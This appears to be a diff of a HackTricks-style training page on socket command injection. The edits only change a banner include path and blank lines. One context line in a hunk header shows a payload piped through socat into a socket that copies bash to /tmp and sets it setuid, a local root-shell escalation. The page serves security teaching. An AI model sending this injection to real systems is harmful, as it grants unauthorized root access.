@@ -1,6 +1,8 @@
 # Socket Command Injection
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include /banners/hacktricks-training.md}}
+
+
 
 ## Socket binding example with Python
 
@@ -44,6 +46,5 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 
 {{#include ../../banners/hacktricks-training.md}}
-
 
 
